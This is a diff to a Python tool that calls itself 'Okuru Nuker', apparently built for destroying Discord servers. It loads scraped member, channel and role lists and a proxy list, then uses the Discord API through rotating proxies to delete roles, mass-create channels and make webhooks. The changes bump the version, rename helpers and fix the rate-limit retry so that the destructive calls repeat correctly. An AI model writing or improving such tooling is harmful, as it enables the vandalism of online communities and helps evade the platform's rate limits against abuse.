@@ -8,10 +8,11 @@ from discord.ext import commands
 from colorama import Fore, init
 from itertools import cycle
 from utils import *
+from tasksio import TaskPool
 
 init()
 
-version = '1.3'
+version = '1.4'
 api = 'v9'
 
 util.setTitle('[Okuru Nuker] - Checking Version')
@@ -41,10 +42,10 @@ with open('config.json') as f:
 util.setTitle('[Okuru Nuker] - Loaded Config')
 
 util.setTitle('[Okuru Nuker] - Loading Scraped')
-proxies = util.getList('proxies.okuru')
-members = util.getList('Scraped/members.okuru')
-channels = util.getList('Scraped/channels.okuru')
-roles = util.getList('Scraped/roles.okuru')
+proxies = util.get_list('proxies.okuru')
+members = util.get_list('Scraped/members.okuru')
+channels = util.get_list('Scraped/channels.okuru')
+roles = util.get_list('Scraped/roles.okuru')
 util.setTitle('[Okuru Nuker] - Loaded Scraped')
 
 proxyPool = cycle(proxies)
@@ -108,7 +109,7 @@ class NukeFunctions:
             util.log('[!]', 'Deleted {}{}'.format(Fore.LIGHTCYAN_EX, RoleID))
         elif r.status_code == 429:
             util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
-            DeleteChannel(ChannelID)
+            return(NukeFunctions.DeleteRole(RoleID))
         return(True)
 
     def MakeWebhook(ChannelID: str) -> str:
@@ -138,18 +139,18 @@ class NukeFunctions:
                 pass
         return(True)
 
-    def CreateChannel(ChannelName: str):
+    def CreateChannel(ChannelID: str):
         r = httpx.post(
             'https://discord.com/api/{}/guilds/{}/channels'.format(api, guild),
             proxies=getProxyDict(),
             headers=headers,
-            json={'name': ChannelName, 'type': 0}
+            json={'name': ChannelID, 'type': 0}
         )
         if r.status_code in [200, 201, 204]:
-            util.log('[!]', 'Created {}#{}'.format(Fore.LIGHTCYAN_EX, ChannelName.replace(' ', '-')))
+            util.log('[!]', 'Created {}#{}'.format(Fore.LIGHTCYAN_EX, ChannelID.replace(' ', '-')))
         elif r.status_code == 429:
             util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
-            CreateChannel(ChannelID)
+            return(NukeFunctions.CreateChannel(ChannelID))
 
 def CreateRole(RoleID: str):
     r = httpx.post(
